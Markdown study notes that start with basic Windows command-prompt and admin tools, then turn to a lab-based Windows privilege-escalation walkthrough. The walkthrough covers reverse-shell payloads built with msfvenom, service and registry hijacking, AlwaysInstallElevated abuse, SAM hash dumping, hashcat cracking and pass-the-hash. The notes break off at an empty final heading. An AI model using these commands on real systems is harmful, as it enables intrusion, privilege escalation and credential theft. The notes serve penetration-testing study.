-------------------

### Learning Windows

-------------------

### Javac 

- `javac <file.java>` to compile a java file
- `java <file.java>` to run the file

### Displaying file contents

Use:
- `more <file name>`
- `type <file name>`

### Exit a terminal with

- `exit`


| **Commands**     |  **syntax**             |    **Actions**        |
|------------------|-------------------------|-----------------------|
|    dir           |    `dir`                |  List a directory     |                
|   cd             |   `cd <directory`       |  Change directory     |
|   cd ..          |   `cd ..`               | Move up a directory   |
|   move           |   `move file file`      | Move a file           |
|   copy           |  `copy file file`       | Copy a file           |
|   del            |   `del <file name>`     |  Delete a file        |  
|   mkdir          | `mkdir <directoryname>` | Make a directory      |

### Redirecting output

- Use `>` and `<`, Linux logic appplies to it,the same with  piping `|`


### Running a cmd shell as admin

- `powershell start cmd  -v runAs`

### Checking list of drivers

- `driverquery`

### Show your PC's details

- `systeminfo`

### Environmental Variables

- `set`

### Prompt

- To change your default text

 ![image](https://github.com/user-attachments/assets/2ee8b3d5-2f3a-47dd-aa3e-0e18548b41d8)

- use `prompt <what you want to do> $G`
- To revert, use `prompt`

### To copy to clipboard

- Just pipe the output of a file to clip e.g `dir | clip`

### Listing files and their extensions

- Use `assoc`

### Changing your cmd title window

- Use `title cmdbaby`

### Comparing 2 files

- Use `fc <file1> <file2>`

### Using `cipher`

- On a PC, deleted files remain accessible to you and other users. So, technically, they are not deleted under the hood.

   `cipher`

### Checking open ports, ip and states

- Use `netstat -an`

### shutdown a system
- Use `shutdown`
- `shutdown /r` will restart a system

### Clear a system shell

- Use `cls`

### Exit cmd

- Use `cmd`

### Rename a file

- use `ren <filename1> <filename2>`

### Creating a file

- use `echo <words> > filename.txt`

### Use `-help` to show a guide on  list

- `powercfg -help`

### To run the Deployment Image Service Management Tool

- Use `dism`

### Show the Serial Number and Label Info of the Current Drive

- Use `vol`

### Pinging an address

- Use `ping <addr>`

### Changing the terminal's color

- Use `color attr` to check a color's index
- use `color <number>` to change color

### Checking a wifi's password

- Use `netsh wlan show profiles` to check wifis previously connected to
- Then,`netsh wlan show profiles name="<wifi's name>" key=clear`

### Using `ipconfig` to check the machine's ip address

- run `ipconfig`
- This command also has extensions such as `ipconfig /release`, `ipconfig /renew`, and `ipconfig /flushdns` which you can use to troubleshoot issues with internet connections

### System file checker `sfc`

- Use `sfc /scannow` to check for corrupt files and repair them
  
### `Powercfg`
  You can use this command with its several extensions to show information about the power state of your PC. 

- `powercfg /energy` to generate a battery health report

### Starting a web address

- use `start <web addr>`

### Showing the tree of the current directory

- Use `tree`

### Os version

- Use `ver`

### Show open programs

- Use `tasklist`

### Killing open programs

- use `taskkill /IM "<program>" /F` to kill a program

### Showing date, time

- Use `date` to show data
- Use `time` to show time

 
------------------------------

### REFERENCES:

- [Freecode camp](https://www.freecodecamp.org/news/command-line-commands-cli-tutorial/)

------------------------------

 
### Understanding Windows

### COnnecting to a remote desktop protocol, use `remmina` on linux 

![image](https://github.com/user-attachments/assets/914044ec-5759-49a0-b26e-7d81e24b40a6)

- Enter ip

![image](https://github.com/user-attachments/assets/a27b0ae2-64e2-4b51-8e7e-a5cd2e56ecca)

- Enter credentials


### Troubleshooting with Msconfig
  
  The System Configuration utility (MSConfig) is for advanced troubleshooting, and its main purpose is to help diagnose startup issues. 

- Use `windowskey + r` ,type `msconfig`

![image](https://github.com/user-attachments/assets/a6c81d7d-cdd4-422e-82e5-7316071f1650)

- Type `taskmgr to run the `task manager` get programs and background processes

![image](https://github.com/user-attachments/assets/83bd7c79-4909-4ce4-bb70-c6648443f897)

### Computer management

The Computer Management (compmgmt) utility has three primary sections: System Tools, Storage, and Services and Applications.

- Type `compmgmt.msc` in the `windowskey + r` dialog box
- The task scheduler is used to enable tasks at startup

![image](https://github.com/user-attachments/assets/0ab80421-0ccf-447d-a983-26205b412b12)

- Event viewer allows us to acccess logs of events hat occurred while using the system

![image](https://github.com/user-attachments/assets/b9a71b7f-e8df-4a18-a720-3bd51621324c)

- Shared folders shows shares or folders that users can have access to

![image](https://github.com/user-attachments/assets/67f17e12-3223-4885-8eb2-418dc68a9eaa)

- Checking `Local Users and Groups`, use `lusrmgr.msc` or check here

![image](https://github.com/user-attachments/assets/851f4af3-f32e-4f55-a017-26b326299fa8)

- Monitoring performance, use `perfmon.exe` or check

![image](https://github.com/user-attachments/assets/38a00f65-1080-421b-b9f5-b62de196e0ed)


### System Information

 - Windows includes a tool called Microsoft System Information (Msinfo32.exe).  This tool gathers information about your computer and displays a comprehensive view of your hardware, system components, and software environment, which you can use to diagnose computer issues

- The system information tab contains the `Environmental variables`.Environment variables store information about the operating system environment. This information includes details such as the operating system path, the number of processors used by the operating system, and the location of temporary folders.The environment variables store data that is used by the operating system and other programs. For example, the WINDIR environment variable contains the location of the Windows installation directory. Programs can query the value of this variable to determine where Windows operating system files are located.

![image](https://github.com/user-attachments/assets/5a841594-c065-4572-b54f-fd69176ceda1)

### Monitoring Resource

- The application  is known as `Resource Monitor` and the executable is `resmon.exe`.Resource Monitor displays per-process and aggregate CPU, memory, disk, and network usage information, in addition to providing details about which processes are using individual file handles and modules. Advanced filtering allows users to isolate the data related to one or more processes (either applications or services), start, stop, pause, and resume services, and close unresponsive applications from the user interface. It also includes a process analysis feature that can help identify deadlocked processes and file locking conflicts so that the user can attempt to resolve the conflict instead of closing an application and potentially losing data

![image](https://github.com/user-attachments/assets/0752dccc-96d7-43f1-afb0-fefa3aca77c4)


### Registry Editor [regedit.exe]

It is an hierarchical database used to store information necessary to configure the system for one or more users, applications, and hardware devices.

- One way to use regedit is `regedit` or `regedt32`.

  ![image](https://github.com/user-attachments/assets/12c25d18-9c07-453e-af44-40c365808f5e)


### Windows Privesc

- Connecting to rdps with `xfreerdp`

      xfreerdp /u:<user> /p:<password> /cert:ignore /v:<host>

### Generating and sending  revshells

- Generating a windows reverse shell executable

      msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your ip> LPORT=<listening port> -f exe -o saucy.exe

- Setting up an smb server with python impacket

      python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

- Copy to the machine

      copy \\<your ip>\kali\<filename> <folder to send to>


### Abusing User's permissions

- To check a user's permission,use `accesschk.exe`

      accesschk.exe /accepteula -uwcqv user <service>

![image](https://github.com/user-attachments/assets/4b9a5bc3-af80-4f15-b6be-82f5b9be749c)

- Check if a binary runs with SYSTEM privileges

      sc qc [service name]
- Modify the config path to our reverseshell's path

      sc config [service name] binpath="\"<reverseshell path>\""

- Then net start `service name` to trigger it

![image](https://github.com/user-attachments/assets/1fa7dbed-e1de-4aa8-9bdb-44ded59ec6a2)

### Unquoted path services

- Exploiting services with unquoted paths

![image](https://github.com/user-attachments/assets/5115d234-5fe0-4daf-af3a-756660097559)

- Use `accesschk /accepteula -uwdq "[service name]"` to check for the user privileges

  ![image](https://github.com/user-attachments/assets/866a466f-3d86-4399-bb13-8087489395e6)

- Copy to the directory and rename with `Common.exe`

      copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

- use `net start [service}` to start shell.


### Weak Registry Permissions

- Write registry access can allow an attacker overwrite the image path registry key of a service . In this case service `regsvc` is vulnerable, group `NT AUTHORITY/INTERACTIVE` can overwrite registry Imagepath.

Command-:```accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc```

![image](https://github.com/user-attachments/assets/6a9b85dd-c13d-4760-85e9-436cbbad8ba8)

- Overwrite the image path

Command-:```reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f```

- Then, use `net start regsvc` to start revshell

![image](https://github.com/user-attachments/assets/efcddbb2-7a35-4bbf-a8f6-7d01cb1b9bfd)


### Insecure Service Executables

- An attacker can swap a services's binary executable with system privileges if it is writable by everyone.

![image](https://github.com/user-attachments/assets/fc1972d0-a859-41b7-9c17-e60c52d5061e)

- Copy and replace the binary with

`copy [path] [path] /Y`

- Start the service with `net start filepermsvc


### Registry Autoruns

- Query with `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` to query the registry for Autorun executables

![image](https://github.com/user-attachments/assets/e1d92284-a179-4105-9407-9a4821568a8d)

- Query with accesschk to see if it is writable by everyone

  Command-: ```C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"```

![image](https://github.com/user-attachments/assets/9d38a137-2369-456b-aeac-99ef3b93ffd4)

- Copy your reverse shell executable to the autorun executable path

- You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves


![image](https://github.com/user-attachments/assets/19321af4-8ba3-427d-afba-12c00530e99f)

### Using rdesktop to login to rdp

- Use `rdesktop -u [user] [ip]`
  

### Generating an msi payload with msfvenom

- Use:
  
      msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT=[port] -f msi -o saucy.msi

![image](https://github.com/user-attachments/assets/2de086ab-a240-46df-b9b9-55baa9f1bde7)

### Registry AllElevated Keys

-  AlwaysInstallElevated" is a Windows Registry setting that affects the behavior of the Windows Installer service. The vulnerability arises when the "AlwaysInstallElevated" registry key is configured with a value of "1" in the Windows Registry.
When this registry key is enabled, it allows non-administrator users to install software packages with elevated privileges. In other words, users who shouldn't have administrative rights can exploit this vulnerability to execute arbitrary code with elevated permissions, potentially compromising the security of the system.

- To check this, use query `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` to check if the value is set to `1` or `0x1`.

![image](https://github.com/user-attachments/assets/e659baaa-85d0-45cf-ae60-a123bd769fa6)

- Copy the msi payload and install with msiexec to trigger a reverse shelll

      msiexec /quiet /qn /i [msi's path]

- Shell

![image](https://github.com/user-attachments/assets/d8b07ea9-8e38-4e1f-a47f-4e2fb3497097)


### Saved passwords

- You can query registry for saved password

      reg query HKLM /f password /t REG_SZ /s

- or query to find admin AUTOLOGON credentials

      reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"

- Spawn a cmd with admin privilege with `winexe`

      winexe -U '[user]%[password]' //[ip] cmd.exe

 ![image](https://github.com/user-attachments/assets/d1dedfcb-0c29-4d1d-8326-8de66e43a93f)

       
### Paaswords- Security Acount Manager (SAM)

- The SAM and SYSTEM files can be used to extract user password hashes
- Copy it to your machine

![image](https://github.com/user-attachments/assets/54334d3b-cc07-4119-83cd-f372acd2db77)

- Install credump7 to dump the hashes

      git clone https://github.com/Tib3rius/creddump7
      pip3 install pycrypto
      python3 creddump7/pwdump.py SYSTEM SAM

- Dump the hashes with pwdump.py

![image](https://github.com/user-attachments/assets/197fbbb0-c037-4ef0-b2db-62af6d48163d)

- Crack the NTLM(New Technology Lan Manager) hash with john

![image](https://github.com/user-attachments/assets/d9316e5c-d530-4b5c-a4e9-b0e2f2ebf4ca)

### Cracking with Hashcat

- Command-:``` hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt```

![image](https://github.com/user-attachments/assets/f1705fa8-15dc-4af9-b568-63210da6e1a1)

- Hashes result

![image](https://github.com/user-attachments/assets/d6f84f35-894d-4a50-93ab-b33ca79b9f45)


### Passing the hash

- You can use the hash to login instead of cracking the password,use `pth-winexe`

       pth-winexe -U "admin%[hash]" //[ip] cmd.exe

- Remember that the hash contains both the LM and NTLM hash seperated by colon

![image](https://github.com/user-attachments/assets/4ee7eeb2-ee1f-471d-9ba7-74cddfaa4f2d)

### Scheduled tasks

- An attacker can abuse a scheduled process running a script running as `SYSTEM` with write access.

![image](https://github.com/user-attachments/assets/59704788-9e65-4a01-a962-8fd5749966ce)

- Append a line that trigger our reverse shell

![image](https://github.com/user-attachments/assets/78abb9ec-d07f-43e7-be1a-5bc2b453dcd2)

- Reverse shell

![image](https://github.com/user-attachments/assets/fbc57a9b-54f1-49ac-88a3-ff9c37520e40)

### Insecure GUI apps




















  









  










